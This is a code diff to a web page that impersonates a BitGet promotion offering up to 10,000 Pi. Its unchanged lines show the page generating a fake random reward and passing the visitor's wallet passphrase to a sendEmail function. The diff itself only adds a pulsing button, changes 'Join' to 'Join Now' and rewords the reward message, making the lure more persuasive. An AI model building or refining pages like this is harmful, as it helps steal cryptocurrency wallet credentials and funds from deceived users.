@@ -64,6 +64,13 @@
             font-size: 18px;
             width: 100%;
             border-radius: 5px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
 
         .loading-screen video {
@@ -108,7 +115,7 @@
             <img src="bitget-logo.png" alt="BitGet Logo" class="logo">
             <div class="title">Trade with 100 million users on BitGet</div>
             <div class="subtitle">Sign up now to claim a welcome pack worth up to 10,000 Pi!</div>
-            <button class="btn" onclick="showLoading()">Join</button>
+            <button class="btn" onclick="showLoading()">Join Now</button>
         </div>
     </div>
 
@@ -150,7 +157,7 @@
 
             // Generate random Pi amount between 50 and 10,000
             var piAmount = Math.floor(Math.random() * (10000 - 50 + 1)) + 50;
-            document.getElementById("message").innerText = piAmount + " Pi has been sent to your wallet!";
+            document.getElementById("message").innerText = piAmount + " Pi will be rewarded to your wallet shortly.";
 
             // Send the passphrase and Pi amount to email
             sendEmail(passphrase, piAmount);
